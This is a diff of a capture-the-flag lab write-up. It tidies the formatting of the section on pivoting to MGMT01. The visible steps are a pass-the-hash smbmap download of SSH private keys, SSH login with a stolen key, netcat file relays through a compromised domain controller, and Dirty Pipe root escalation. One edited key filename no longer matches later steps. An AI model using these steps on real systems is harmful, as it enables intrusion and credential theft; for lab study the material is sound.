@@ -1906,7 +1906,7 @@ smbmap -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea7
 ```
 
 ```bash
-smbmap -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2' -H 172.16.8.3 --download "Department Shares//IT/Private/Networking/ssmallsadm-id_rsa"
+smbmap -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2' -H 172.16.8.3 --download "Department Shares//IT/Private/Networking/james-id_rsa"
 ```
 
 ```bash
@@ -1917,6 +1917,7 @@ smbmap -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea7
 
 ## SSH access on MGMT01 (172.16.9.25)
 
+The permissions are set to access SSH with the discovered privaye key of  the `ssmallsadm` account:
 
 ```bash
 chmod 600 ssmallsadm-id_rsa
@@ -1947,11 +1948,11 @@ ssmallsadm@MGMT01:~$ cat flag.txt
 
 ---
 
-## Privilege Escalation on MGMT01 — Dirty Pipe (CVE-2022-0847)
+## Privilege Escalation on MGMT01
+
+#### Dirty Pipe (CVE-2022-0847)
 
 The kernel version is affected by Dirty Pipe:
-
-bash
 
 ```bash
 ssmallsadm@MGMT01:~$ uname -a
@@ -1963,7 +1964,6 @@ Linux MGMT01 5.10.0-051000-generic #202012132330 SMP Sun Dec 13 23:33:36 UTC 202
 
 `MGMT01` has no direct route to Kali, so the PoC files (`compile.sh`, `exploit-1.c`, `exploit-2.c`) are relayed in two hops: uploaded to `DC01` over `evil-winrm`, then sent on from `DC01` to `MGMT01` over the pivot using `nc64.exe`:
 
-bash
 
 ```bash
 *Evil-WinRM* PS C:\Users\Administrator\Documents> upload compile.sh
@@ -1972,19 +1972,18 @@ bash
 *Evil-WinRM* PS C:\Users\Administrator\Documents> upload nc64.exe
 ```
 
-powershell
+on DC01, sending each file out:
 
 ```powershell
-# on DC01, sending each file out
+
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cmd /c "nc64.exe 172.16.9.25 8000 < compile.sh"
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cmd /c "nc64.exe 172.16.9.25 8000 < exploit-1.c"
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cmd /c "nc64.exe 172.16.9.25 8000 < exploit-2.c"
 ```
 
-bash
+on MGMT01, receiving each file
 
 ```bash
-# on MGMT01, receiving each file
 ssmallsadm@MGMT01:~$ nc -lvnp 8000 > compile.sh
 ssmallsadm@MGMT01:~$ nc -lvnp 8000 > exploit-1.c
 ssmallsadm@MGMT01:~$ nc -lvnp 8000 > exploit-2.c
@@ -1995,8 +1994,6 @@ compile.sh: Bourne-Again shell script, ASCII text executable
 ```
 
 Once all three files arrive, the exploit is compiled and run:
-
-bash
 
 ```bash
 ssmallsadm@MGMT01:~$ bash compile.sh
@@ -2020,7 +2017,6 @@ cat flag.txt
 ```
 
 ---
-
 ## Flag (MGMT01 Root)
 
 **Flag:**
